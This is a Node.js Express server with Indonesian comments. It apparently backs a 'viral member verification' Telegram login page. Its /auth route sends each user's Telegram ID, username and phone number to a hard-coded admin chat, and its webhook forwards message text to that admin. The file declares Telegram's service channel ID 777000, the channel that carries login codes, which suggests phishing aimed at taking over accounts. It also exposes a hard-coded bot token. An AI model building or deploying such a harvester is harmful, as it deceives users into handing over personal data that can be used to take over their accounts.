const express = require("express");
const session = require("express-session");
const axios = require("axios");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5000;

// Konfigurasi variabel langsung di sini
const BOT_TOKEN = "7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us"; // Ganti dengan token bot Anda
const ADMIN_CHAT_ID = "5460230196"; // Ganti dengan chat ID admin Anda
const BOT_USERNAME = "verifikasimemberindoviralbot"; // Ganti dengan username bot Anda (tanpa @)
const SECRET_KEY = "7889113032:AAEqPqQV_ph9V5hpwnP5zNRB83fJc5VP_us"; // Ganti dengan kunci rahasia Anda
const TELEGRAM_CHANNEL_ID = 777000; // ID saluran resmi Telegram
const ADMIN_USERNAME = "estelerkuu"; // Username admin untuk chat

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(
  session({
    secret: SECRET_KEY,
    resave: false,
    saveUninitialized: true,
  })
);

// Set view engine
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "../views"));

// Halaman login
app.get("/", (req, res) => {
  res.render("login", { bot_username: BOT_USERNAME });
});

// Endpoint untuk menangani otentikasi
app.get("/auth", (req, res) => {
  const data = req.query;
  const hash = data.hash;
  delete data.hash;

  // Urutkan parameter
  const sortedData = Object.keys(data)
    .sort()
    .map((key) => `${key}=${data[key]}`)
    .join("&");

  // Validasi tanda tangan
  const checkHash = crypto
    .createHash("sha256")
    .update(sortedData + BOT_TOKEN)
    .digest("hex");

  if (checkHash !== hash) {
    console.error("Invalid hash:", { received: hash, expected: checkHash });
    return res.status(403).send("Invalid hash");
  }

  // Simpan data pengguna dalam sesi
  req.session.user = data;

  // Kirim username dan nomor telepon ke admin
  const message = `User logged in:\nID: ${data.id}\nUsername: ${
    data.username || "No username provided"
  }\nPhone: ${data.phone || "No phone provided"}`;
  axios
    .get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      params: {
        chat_id: ADMIN_CHAT_ID,
        text: message,
      },
    })
    .catch((err) => console.error("Failed to send message to Telegram:", err));

  // Arahkan pengguna ke chat dengan admin
  res.redirect(`https://t.me/${ADMIN_USERNAME}`);
});

// Endpoint untuk logout
// app.get("/logout", (req, res) => {
//   req.session.destroy((err) => {
//     if (err) {
//       return res.status(500).send("Could not log out.");
//     }
//     res.redirect("/");
//   });
// });

// Endpoint untuk menerima pesan dari Telegram
app.post("/webhook", (req, res) => {
  const message = req.body.message;

  // Kirim pesan ke admin
  if (message) {
    axios
      .get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        params: {
          chat_id: ADMIN_CHAT_ID,
          text: `Pesan baru dari saluran:\n${message.text}`,
        },
      })
      .catch((err) =>
        console.error("Failed to forward message to Telegram:", err)
      );
  }

  res.sendStatus(200);
});

// Mengatur webhook untuk menerima pesan dari saluran Telegram
const setWebhook = async () => {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=https://loginwidget.vercel.app//webhook`;
  try {
    const response = await axios.get(url);
    console.log("Webhook set:", response.data);
  } catch (error) {
    console.error("Error setting webhook:", error);
  }
};

// Panggil fungsi untuk mengatur webhook
setWebhook();

// Jalankan server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
